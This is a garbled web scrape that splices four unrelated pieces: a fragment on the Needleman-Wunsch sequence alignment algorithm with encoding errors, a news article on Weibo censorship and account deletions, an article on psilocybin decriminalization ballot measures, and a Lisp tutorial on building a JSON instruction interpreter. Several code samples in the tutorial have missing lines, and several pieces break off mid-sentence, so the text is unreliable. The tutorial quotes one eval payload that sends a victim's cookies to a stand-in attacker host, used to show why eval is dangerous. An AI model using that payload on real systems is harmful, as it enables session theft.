    if n == 0 or m == 0:
        return 1

<ul>
<li>
<p>There are 3 possible alignments of two 1-element sequences:</p>

<li>
<p>Computing the alignment score takes time <a href="https://en.wikipedia.org/wiki/Time_complexity#Linear_time">linear</a> in the sizes of both sequences: <a href="https://en.wikipedia.org/wiki/Big_O_notation">O</a>(<var>n</var>Â&nbsp;+Â&nbsp;<var>m</var>).</p>

</ul>
<p>As a result, the overall time complexity of the brute force solution is:</p>
<blockquote>
<p>O( <a href="https://en.wikipedia.org/wiki/Delannoy_number"><var>D</var>(<var>n</var>, <var>m</var>)</a> Ã— (<var>n</var> + <var>m</var>) )</p>
</blockquote>

<p>The brute force solution is simple, but it doesn't scale well.
In practice, sequence alignment is used to analyze sequences of biological data (e.g. <a href="https://en.wikipedia.org/wiki/Nucleic_acid_sequence">nucleic acid sequences</a>).
Given that the size of these sequences can be hundreds or thousands of elements
long, there's no way that the brute force solution would work for data of that
size.</p>
<p>In 1970, Saul B. Needleman and Christian D. Wunsch created a faster algorithm
to solve this problem: the <a href="https://en.wikipedia.org/wiki/Needleman%E2%80%93Wunsch_algorithm">Needleman-Wunsch algorithm</a>.
(See <a href="https://www.sciencedirect.com/science/article/abs/pii/0022283670900574">"A general method applicable to the search for similarities in the amino acid sequence of two proteins"</a>, <a href="https://doi.org/10.1016/0022-2836(70)90057-4">https://doi.org/10.1016/0022-2836(70)90057-4</a>.)
The algorithm uses <a href="https://en.wikipedia.org/wiki/Dynamic_programming">dynamic programming</a> to solve the sequence alignment problem in O(<var>m</var><var>n</var>) time.</p>
<p>Here's a Python implementation of the Needleman-Wunsch algorithm, based on section 3 of <a href="https://upload.wikimedia.org/wikipedia/en/c/c4/ParallelNeedlemanAlgorithm.pdf">"Parallel Needleman-Wunsch Algorithm for Grid"</a>:</p>

<p>Chow Po-chung<strong>’</strong>s sixth Weibo account was killed on August 11, one day after he posted a photo of Hong Kong’s Lion Rock with the caption: “Hong Kong, my home.”</p>



<p>Chow, a political philosophy professor at the Chinese University of Hong Kong, had anticipated this. A few weeks earlier, China had enacted a broad and vaguely worded <a href="https://www.nytimes.com/2020/06/30/world/asia/hong-kong-security-law-explain.html">national security law</a> in Hong Kong, which criminalizes pro-independence sentiments, and anything else that authorities interpret as “splittist” or damaging to China’s sovereignty.&nbsp;</p>



<p>Lion Rock, a mountain overlooking central Hong Kong, has become a symbol of the city’s pro-democracy movement. Within hours of Chow’s post, the comment section beneath it was flooded with nationalistic comments and personal attacks. He estimated hundreds of users reported him to Weibo for “trying to divide China,” and his account was deleted.</p>



<p>Nearly 550 million people — <a href="http://www.xinhuanet.com/politics/2020-04/28/c_1125915967.htm">more than 60% of China’s internet</a> users — have an account on Weibo, a microblogging platform owned by the Beijing-based Sina Corporation. Since its launch in 2009, the platform evolved into a rare space for public discussion in China, crucial for disseminating information, shaping political discussion, and generating grassroots campaigns, until heavy censorship kicked in two years later.</p>



<p>Chow opened his first account in 2011. He shared the joy of becoming a new father, photos with students, his teaching notes, his essays, and his experience partaking in social movements. He also facilitated and participated in ideological and philosophical debates with young Weibo users. He amassed 180,000 followers before being censored in June 2018. Five of his accounts have since been deleted, some due to posts about the protests, others for no obvious reason.&nbsp;</p>



<p>“I considered every message I posted as my last one,” Chow says.&nbsp;</p>



<p>While Weibo has always censored accounts, as Chinese authorities have stepped up their crackdown on freedom of speech and tightened their grip over all aspects of Chinese life in recent years, political discussions on the platform have become even more muted. Due to pervasive censorship and self-censorship, conversations on Weibo are even more cautious. <em>Zhahao</em>, or “account bombing,” where accounts voicing dissenting opinions get censored, have become more common. Ultranationalistic and chauvinist narratives now drown out critical posts, making it harder for users to speak their minds.</p>



<hr>



<p>Chinese authorities give social media platforms general guidance about what topics and users to monitor or censor, leaving Weibo to decide which keywords and accounts to block.&nbsp;</p>



<p>Even if regulators have their eyes on a specific message or account, they still need the service provider to actually delete the content, according to Fu King-wa, a journalism professor at The University of Hong Kong. State censorship began to intensify in 2011, when social media debates on controversial environmental, social, and cultural issues started to spill over to offline grassroots protests and campaigns, Fu says. This included dozens of ordinary people challenging China’s election system by campaigning as independent candidates on Weibo, and users addressing the controversy around the Red Cross Society of China, which erupted after a young senior official at the government-run charity posted photos on Weibo of her lavish lifestyle.&nbsp;</p>



<p>Fu says it’s not clear if censorship has stepped up again in recent years, as he doesn’t have figures to compare early censorship to what’s happening now, but he suggests that years of censorship have intimidated users into silence.&nbsp;</p>



<p>According to the <a href="https://weiboscope.jmsc.hku.hk/">Weiboscope</a> tracker, which Fu runs at Hong Kong University, nearly 2% of 54,490 random user accounts tracked in 2015 no longer existed by 2020. Fu believes most of the lost accounts were deleted by Weibo. This is a rough estimate, as some accounts may have been reactivated since they were deleted, or deleted by users.</p>



<p>“By the end of 2019, the discussion on Weibo was really dominated by discourse and narratives created by state media,” Fu says. “Finding alternative discussion on issues like the Hong Kong protest was very difficult, unless you followed the less popular accounts.”</p>

<p>A more alarming trend, Fu says, is that nationalistic users are now mobilizing hundreds or thousands of people to report on people with political views they oppose and thus pressure Weibo to “kill” their accounts. According to Chow, this tactic is reminiscent of Cultural Revolution–style purging of political rivals. When enough people report on the same account, there is little doubt that censors will delete it.&nbsp;</p>



<p>Shutting down accounts intimidates users into self-censorship. Weibo still serves as a critical venue for public discussion: 2020 has brought an increasing usage of the site, Fu notes, because more Chinese took to Weibo to voice their grievances, frustration, and discontent amid the outbreak of Covid-19 in Wuhan. But when users fear they will lose their accounts, they no longer speak as freely.</p>



<p>Weibo users who spoke to <em>Rest of World</em> all noticed a trend of increasing censorship over the past few years. Accounts have been removed after mentioning politically sensitive topics, such as the protests in Hong Kong, China’s human rights violations against Uighurs in Xinjiang, Covid-19, and top political leaders.&nbsp;</p>



<p>When she became active on Weibo in early 2018, Lao Yang, whose nickname is roughly translated as “Old Yang,” fiercely advocated for gender equality and human rights to her 50,000 followers. “I enjoyed just shifting the conversation a little bit more toward the uncomfortable. I enjoyed being the asshole in the room,” Yang says.</p>



<p>Her account was deleted last summer after she signaled support for the Hong Kong protests. When she started a new account, a self-proclaimed Weibo staff member reached out and advised her to lay low for a while as she’d already popped onto the radar of the Cyberspace Administration, China’s central internet censor. They told her that whenever she posted sensitive words, primarily in relation to Hong Kong, authorities at the Cyberspace Administration received an algorithmic notice.&nbsp;</p>



<p>“As long as you keep your account,” reads a message from the Weibo worker that was reviewed by <em>Rest of World</em>, “you can keep your advocacy going.”</p>



<p>Yang followed the advice. She went back to advocacy after a few months, but her account was finally “bombed” on New Year’s Day. Whenever she tries to start a new one, it is deleted within 24 hours. And mainland Weibo users can face severe consequences beyond censorship. If their real identity is revealed, nationalist Weibo users may report them to their employers.&nbsp;</p>



<p>In 2013, China instituted a <a href="http://cpc.people.com.cn/n/2013/0910/c87228-22871736.html">law</a> stating that, if one user’s post is considered defamatory and is viewed 5,000 times or reposted more than 500 times, the original poster can face a jail sentence.</p>



<p>Zhahao<em> </em>attacks can also be very disturbing for their victims. “The first bombing dealt a big blow to me,” Chow says. “This was an attack on your life, your memory, your social network, and your identity as a whole.”</p>

<hr>



<p>Weibo has <a href="http://www.xinhuanet.com//2017-09/14/c_1121665443.htm">required</a> real-name verification upon registration since 2017, linking accounts to people’s official ID or phone number. But users who have been kicked off have been able to get back on using burner accounts from underground online shops.</p>



<p>It’s unclear how such shops set up bot accounts — none of those contacted would talk with a journalist. The cost of a burner account ranges from 0.5 yuan (7 cents) to 240 yuan ($35). The account sellers operate in a legal gray zone, catering mainly to accounts looking to boost their profiles. Authorities have been cracking down on such shops in recent years. In 2018, China’s central internet regulator <a href="https://www.thepaper.cn/newsDetail_forward_2645705">launched a campaign</a> to remove users who obtained burner accounts after being banned on social media platforms.</p>



<p>Wu Xianwei turned to buying burners after her first two accounts were removed. Wu, who grew up in Shanghai but is a Canadian citizen, recently completed her Ph.D. in communications at the University of Iowa. Her first account was censored in March 2018, after China scrapped presidential term limits, allowing current president Xi Jinping to remain in power indefinitely. Wu reposted a statement that read: “I disagree.” The following day, all the accounts that she knew reposted it had disappeared.</p>



<p>Her spare account, also listed under a pseudonym, was active for only two months until she shared a satirical picture mocking Xi and Kim Jong Un.&nbsp;</p>



<p>Wu bought 20 burner accounts for 10 yuan ($1.50) in 2018 and went through every single one of them within a year. Since then, getting ahold of burners has become more difficult. When Wu went back to the same shop for more last year, she found that it no longer existed. Many others have also shut down.&nbsp;</p>



<p>In 2019, Wu says, about 100 of her Weibo friends also lost their accounts. Most of them were highly educated liberals, and they formed a WeChat group to stay in touch. That group, too, has been deleted and re-created.&nbsp;</p>



<p>Still, Wu has been galvanized by the experience. She keeps reappearing on Weibo just to “piss off” ultranationalistic users.&nbsp;</p>



<p>Living overseas, Wu is protected from the worst of the consequences of zhahao. For those based in China, or with family in the country, the stakes are much higher than just losing their accounts. One of Wu’s friends was summoned to a police station after posting an image of the cartoon character Winnie the Pooh, which is commonly used to mock Xi Jinping due to a perceived likeness between the two.</p>



<p>Some censored Weibo users have switched platforms. Chow and Yang have both moved onto Twitter, but there, their impact and audience are smaller. Around 10,000 of Chow’s followers have come with him to the U.S. platform, which is blocked in China. He says that he’s not given …</p></div></div>

<p>When Melissa Lavasani began suffering from postpartum depression after the birth of her second child, she tried a variety of treatments: talk therapy, cupping, and acupuncture. “Things were spiraling,” she said. Worried that pharmaceutical antidepressants would create a long-term dependency, she learned of a new treatment option when she listened to a podcast featuring <a href="https://www.discovermagazine.com/environment/how-mushrooms-can-save-the-world" target="_blank">Paul Stamets</a>, a mycologist (fungi expert) and evangelist for the healing potential of psilocybin, the main component of magic mushrooms.&nbsp;</p><p>When Lavasani tried microdosing psilocybin to treat her depression, she immediately felt better. “But it was nerve wracking,” she said. “I was well aware I was in possession of a Schedule 1 drug. I knew I was breaking the law. I was fearful I would lose my job, lose my children.”</p><p>Now Lavasani has also become an evangelist for using psilocybin for therapeutic purposes, organizing a Nov. 3 <a href="https://ballotpedia.org/Washington,_D.C.,_Initiative_81,_Entheogenic_Plants_and_Fungus_Measure_(2020)" target="_blank">ballot initiative</a> that asks Washington, D.C. voters to effectively decriminalize plant-based medicines. The initiative asks D.C. police to place home growing, possession, and gifting of psychedelic plants and fungi among its lowest law enforcement priorities and requests that the D.C. attorney general stop prosecuting these cases.</p><p>D.C. voters aren’t the only ones considering a hallucinogenic fungi-related ballot initiative this year. On the other side of the country, Oregon residents will weigh in on two measures: <a href="https://ballotpedia.org/Oregon_Measure_110,_Drug_Decriminalization_and_Addiction_Treatment_Initiative_(2020)" target="_blank">one that would decriminalize</a> personal use of most common drugs, including magic mushrooms, and <a href="https://ballotpedia.org/Oregon_Measure_109,_Psilocybin_Mushroom_Services_Program_Initiative_(2020)" target="_blank">another that would create a program</a> for the supervised, therapeutic use of psilocybin in clinical settings. If the measures pass, these places would join the ranks of Oakland, Santa Cruz, Denver, and Ann Arbor—all cities that have taken steps to decriminalize magic mushrooms in the past year.&nbsp;&nbsp;</p><p>Many of these places were also the forerunners in the marijuana decriminalization and legalization movement. Oregon was the first state to decriminalize cannabis in 1973, while Colorado, along with Washington state, was the first to legalize recreational cannabis in 2012.&nbsp; Cities like Oakland and Denver were among the first to establish functioning legal markets for the drug. The movement grew to <a href="https://www.ncsl.org/research/health/state-medical-marijuana-laws.aspx" target="_blank">other places</a>, driven largely by ballot measures, with recreational pot sales allowed in 11 states and medical use of marijuana permitted in 32 states and the District of Columbia.</p><p>The gradual acceptance of marijuana set the stage for other drugs like mushrooms, said Heather Trela, a researcher who <a href="https://rockinst.org/blog/has-marijuana-provided-a-blueprint-for-magic-mushrooms/" target="_blank">studies cannabis policy</a> at the Rockefeller Institute of Government at the State University of New York.&nbsp;</p><p>“Marijuana broke the glass ceiling,” she explained. “Legalizing that drug wasn’t the catastrophe some people were expecting. Mushroom campaigns will certainly benefit from that pathway being cleared already.”</p><p>But the measures aren’t without critics. In Oregon, for example, medical organizations have warned about the dangers of moving ahead with offering patients treatments that aren’t fully vetted by the federal government.</p><p>U.S. Rep. Andy Harris, a Maryland Republican who is one of the <a href="https://www.washingtonpost.com/local/md-politics/maryland-rep-andy-harris-has-become-public-enemy-no-1-for-marijuana-activists-how-did-it-get-so-personal/2019/04/15/93ac9c32-5fc4-11e9-bfad-36a7eb36cb60_story.html" target="_blank">most vocal opponents</a> of D.C.’s attempt to legalize marijuana, urged city voters not to take the same attitude towards psychedelics that they did towards pot. “This is a bald-faced attempt to just make these very serious, very potent, very dangerous—both short-term and long-term—hallucinogenic drugs broadly available,” Harris said in an interview with the <a href="https://nypost.com/2020/07/08/congressman-vows-vote-to-stop-dc-from-allowing-psychedelics/" target="_blank"><em>New York Post</em></a><em>.</em></p><p>Some of the factors that helped marijuana gain legal status through ballot initiatives in states across the country won’t be as helpful for mushrooms. For starters, marijuana is the most popular recreational drug on the market, with close to <a href="https://www.washingtonpost.com/news/wonk/wp/2017/04/19/11-charts-that-show-marijuana-has-truly-gone-mainstream/" target="_blank">35 million people</a> defined as regular users who consume at least once a month—meaning there’s a lot of potential voters who’d like to see it legalized. The data on regular psychedelic drug users isn’t as reliable; the best estimates come from <a href="https://www.samhsa.gov/data/data-we-collect/nsduh-national-survey-drug-use-and-health" target="_blank">an annual survey</a> of around 67,500 people conducted by the Substance Abuse and Mental Health Services Administration, which has found an average of 0.1% of respondents to be current psychedelic users—scaled up to the U.S. population, that’s less than 350,000 people.&nbsp;</p><p>Because the potential user base is so small—and it seems unlikely to substantially increase due solely to decriminalization—ballot initiative organizers can’t make financial arguments about tax revenue, a <a href="https://www.westword.com/marijuana/colorado-crosses-1-billion-in-marijuana-tax-revenue-11374499" target="_blank">major selling point</a> for recreational marijuana. They also can’t make as clear an argument that psychedelic legalization is a knock against the War on Drugs, another common refrain in the pot legalization movement. (Although some researchers <a href="https://www.nytimes.com/2019/05/08/us/denver-magic-mushrooms-decriminalization.html" target="_blank">have argued</a> that labeling some drugs as “good” and other drugs as “bad” inherently perpetuates the drug war.)</p><p>In places like Denver, where voters decriminalized mushrooms in 2019, <a href="https://www.nytimes.com/2019/05/08/us/denver-magic-mushrooms-decriminalization.html" target="_blank">only 11 cases</a> for mushroom possession were prosecuted in the three years leading up to the ballot initiative, and numbers are similarly low in other places. “Mushrooms have never been a huge priority for law enforcement,” Trela said. “The data doesn’t exist to show disproportionate arrests of people of color in this case <a href="https://norml.org/marijuana/fact-sheets/racial-disparity-in-marijuana-arrests/" target="_blank">as it does for marijuana</a>.”</p><p>Sam Chapman, the campaign manager for <a href="https://voteyeson109.org/measure-109/" target="_blank">Yes on 109</a>, one of the ballot initiatives in Oregon, said that “cannabis is not psilocybin from a historical or political context” but that “cannabis legalization helped show the general public how big a failure the War on Drugs has been.” The biggest lesson mushroom campaigns can take from marijuana legalization, he said, is ensuring that people of color have equitable access to therapy and licensing if it becomes available—a stumbling point of some marijuana legalization efforts where critics have noted that the people who have <a href="https://www.usatoday.com/story/news/nation/2019/12/21/chicago-recreational-marijuana-dispensary-owners-diversity/4366180002/" target="_blank">reaped the benefits</a> of the new market have been largely white and male.</p><p>But organizers say they aren’t worried that they lack the financial and social justice arguments of the cannabis movement—because the chief benefit is the drug’s medical uses. “There’s a lot of scientific education that needs to be done for these campaigns, more so than with cannabis,” said Lavasani in D.C. “This isn’t a recreational party drug. It’s a therapy for people when no other solution works.”</p><figure><img alt="" height="900" src="https://www.route-fifty.com/media/ckeditor-uploads/2020/10/23/Image%20from%20iOS%20(1).jpg" width="1200">

</figure><p>Psilocybin, the naturally-occurring psychedelic component of magic mushrooms, has been utilized for thousands of years by <a href="https://akjournals.com/view/journals/2054/4/1/article-p16.xml" target="_blank">Indigenous tribes</a> for medicinal and spiritual purposes. (The current psychedelic movement <a href="https://doubleblindmag.com/native-tribes-should-have-more-say-in-the-psychedelic-movement/" target="_blank">has been criticized</a> for failing to include Indigenous voices.)&nbsp;</p><p><a href="https://slate.com/technology/2017/01/the-war-on-drugs-halted-research-into-the-potential-benefits-of-psychedelics.html" target="_blank">Clinical research</a> and <a href="https://www.gla.ac.uk/media/Media_529630_smxx.pdf" target="_blank">recreational use</a> of the drug skyrocketed in the 1960s, followed by a swift crack down in 1968, when President Richard Nixon declared drugs to be “public enemy number one” and placed psychedelics like both LSD and mushrooms, along with marijuana, in the <a href="https://www.dea.gov/drug-scheduling" target="_blank">“Schedule 1” category</a>—meaning they have “no accepted medical use” and a “high potential for abuse.”</p><p>More recently, the FDA gave psilocybin a “<a href="https://newatlas.com/science/psilocybin-major-depression-mdd-usona-breakthrough-therapy-fda/" target="_blank">breakthrough therapy</a>” designation for patients who have treatment-resistant depression, an action meant to speed drug development. Research into psilocybin has been severely stymied since the 1960s, but institutions like Johns Hopkins, Stanford, and the University of California in Los Angeles have made significant strides in recent years showing the potential uses of psilocybin in treating <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6007659/" target="_blank">depression</a> and anxiety, <a href="https://journals.sagepub.com/doi/full/10.1177/2470547020939564" target="_blank">PTSD</a> among veterans, and <a href="https://clinicaltrials.gov/ct2/show/NCT04052568" target="_blank">eating disorders</a>. Researchers are hopeful about a number of other applications for diseases like smoking and drug addiction, Alzheimers, and multiple sclerosis.</p><p>That new research is changing the perception of psychedelics—but there’s still a lot of stigma, said Ismail Ali, the policy and advocacy counsel for the Multidisciplinary Association for Psychedelic Studies, a nonprofit research organization. “Right now one of the things that prevents people from publicly talking about psychedelic initiatives is because of this association with rowdy or hedonistic or non-establishment-friendly ideologies and communities,” Ali said. “There’s potential that if there's more visibility coming from [state and local initiatives], it would be easier for researchers and potential patients … to get good accurate information because it's less stigmatized to openly talk about it.”</p><p>Oregon’s Measure 109 might have the greatest chance of passing, Trela said, simply because it is so narrowly focused on the use of psilocybin in therapeutic contexts—and it therefore “cuts off slippery slope arguments.” But medical organizations have raised questions, most notably the <a href="http://www.oregonpsychiatric.org/uploads/6/0/5/6/60567621/20200912-m109apa.pdf" target="_blank">American Psychiatric Association</a> and the <a href="http://www.oregonpsychiatric.org/uploads/6/0/5/6/60567621/20200912-m109oppa.pdf" target="_blank">Oregon Psychiatric Physicians Association</a>, which argue that because psilocybin therapeutic treatment is not yet approved by the FDA, the measure “makes …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>Every lisp hacker I ever met, myself included, thought that all those brackets in Lisp were off-putting and weird. At first, of course. Soon after we all came to the same epiphany: <em>lisp’s power lies in those brackets</em>! In this essay, we’ll go on a journey to that epiphany.</p><p>Say we were creating a program that let you draw stuff. If we wrote this in JavaScript, we might have functions like this:</p><pre><code><span>drawPoint</span><span>({x: </span><span>0</span><span>, y: </span><span>1</span><span>}, </span><span>'yellow'</span><span>)</span>
<span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>drawCircle</span><span>(</span><span>point</span><span>, </span><span>radius</span><span>, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span>
<span>...</span></code></pre><p>So far, so cool.</p><p>Now, here’s a challenge: <strong>Can we support remote drawing?</strong></p><p>This means that a user would be able to “send” instructions to your screen, and you would see their drawing come to life.</p><p>How could we do it?</p><p>Well, say we set up a websocket connection. We could receive instructions from the user like this: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>/* TODO */</span><span> </span>
<span>})</span></code></pre><p>To make it work off the bat, one option could be to take code strings as input:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> {</span>
<span>  </span><span>eval</span><span>(</span><span>data</span><span>)</span>
<span>})</span></code></pre><p>Now the user could send <code>"drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')"</code> and bam: we’ll draw a line! </p><p>But…your spidey sense may already be tingling. What if the user was malicious and managed to send us an instruction like this:</p><pre><code><span>"window.location='http://iwillp3wn.com?user_info=' + document.cookie"</span></code></pre><p>Uh oh…our cookie would get sent to iwillp3wn.com, and the malicious user would indeed pwn us. We can’t use eval; it’s too dangerous. </p><p>There lies our problem: we can’t use <code>eval</code>, but we need some way to receive arbitrary instructions.</p><p>Well, we could represent those instructions as JSON. We can map each JSON instruction to a special function, and that way we can control what runs. Here’s one way we can represent it:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>This JSON would translate to <code>drawLine({x: 0, y: 0}, {x: 1, y: 1},"blue")</code></p><p>We could support this pretty simply. Here’s how our <code>onMessage</code> could look:</p><pre><code><span>webSocket</span><span>.onMessage</span><span>(</span><span>instruction</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>((</span><span>ins</span><span>) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>ins</span><span>.</span><span>functionName</span><span>](</span><span>...</span><span>ins</span><span>.</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>That seems like it would work!</p><p>Let’s see if we can clean this up. Here’s our JSON:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>Well, since <em>every</em> instruction has a <code>functionName</code>, and an <code>args</code>, we don’t really need to spell that out. We <em>could</em> write it like this: </p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>]],</span>
<span>}</span></code></pre><p>Nice! We changed our object in favor of an array. To handle that, all we need is a rule: <strong>the</strong> <strong><em>first</em></strong> <strong>part of our instruction is the function name, and the <em>rest</em> are arguments.</strong> If we wrote that down, here’s how our <code>onMessage</code> would look: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(([</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>]) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>And bam, <code>drawLine</code> would work again!</p><p>So far, we only used <code>drawLine</code>:</p><pre><code><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>// same as</span>
<span>[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]</span></code></pre><p>But what if we wanted to express something more powerful:</p><pre><code><span>rotate</span><span>(</span><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>), </span><span>90</span><span>)</span></code></pre><p>Looking at that, we can translate it to an instruction like this:</p><pre><code><span>[</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]</span></code></pre><p>Here, the <code>rotate</code> instruction has an argument that is in <em>itself</em> an instruction! Pretty powerful. Surprisingly, we just need to tweak our code a tiny bit to make it work:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>if</span><span> (</span><span>!</span><span>Array</span><span>.isArray</span><span>(</span><span>ins</span><span>)) {</span>
<span>      </span><span>// this must be a primitive argument, like {x: 0 y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>
<span>    }</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>return</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>.map</span><span>(</span><span>parseInstruction</span><span>));</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(</span><span>parseInstruction</span><span>);</span>
<span>})</span></code></pre><p>Nice, We introduce a <code>parseInstruction</code> function. We can apply <code>parseInstruction</code> recursively to arguments, and support stuff like:</p><pre><code><span>[</span><span>"rotate"</span><span>, [</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]]]</span></code></pre><p>Very cool!</p><p>Okay, let’s look at our JSON again:</p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]],</span>
<span>}</span></code></pre><p>Well, our data <em>only</em> contains instructions. Do we really need a key called <code>instructions</code>? </p><p>What if we did this: </p><pre><code><span>[</span><span>"do"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]]</span></code></pre><p>Instead of a top-level key, we could have a special instruction called <code>do</code>, which runs all the instructions it’s given.</p><p>Here’s one way we can implement it:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>

<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>);</span>
<span>})</span></code></pre><p>Oh wow, that was easy. We just added <code>do</code> in <code>fns</code>. Now we can support an instruction like this:</p><pre><code><span>[</span>
<span>  </span><span>"do"</span><span>,</span>
<span>  [</span><span>"drawPoint"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }],</span>

<span>];</span></code></pre><p>Let’s make it more interesting. What if we wanted to support <em>definitions?</em></p><pre><code><span>const</span><span> </span><span>shape</span><span> </span><span>=</span><span> </span><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span></code></pre><p>If we could support definitions, our remote user could write some very expressive instructions! Let’s convert our code to the kind of data structure we’ve been playing with:</p><pre><code><span>[</span><span>"def"</span><span>, </span><span>"shape"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]]</span>

<span>];</span></code></pre><p>Not bad!</p><p>Let’s step it up a notch. What if we let our remote user <em>define their own functions?</em> </p><p>Say they wanted to write something like this:</p><pre><code><span>const</span><span> </span><span>drawTriangle</span><span> </span><span>=</span><span> </span><span>function</span><span>(</span><span>left</span><span>, </span><span>top</span><span>, </span><span>right</span><span>, </span><span>color</span><span>) { </span>

<span>} </span>
<span>drawTriangle</span><span>(</span><span>...</span><span>)</span></code></pre><p>How would we do it? Let’s follow our intuition again. If we transcribe this to our data representation, here’s how it could look:</p><pre><code><span>  [</span><span>"def"</span><span>, </span><span>"drawTriangle"</span><span>,</span>

What if we did this:</p><pre><code><span>const</span><span> </span><span>parseFnInstruction</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>body</span><span>, </span><span>oldVariables</span><span>) </span><span>=&gt;</span><span> {</span>

<span>    </span><span>return</span><span> </span><span>parseInstruction</span><span>(</span><span>body</span><span>, </span><span>newVariables</span><span>);</span>
<span>  };</span>
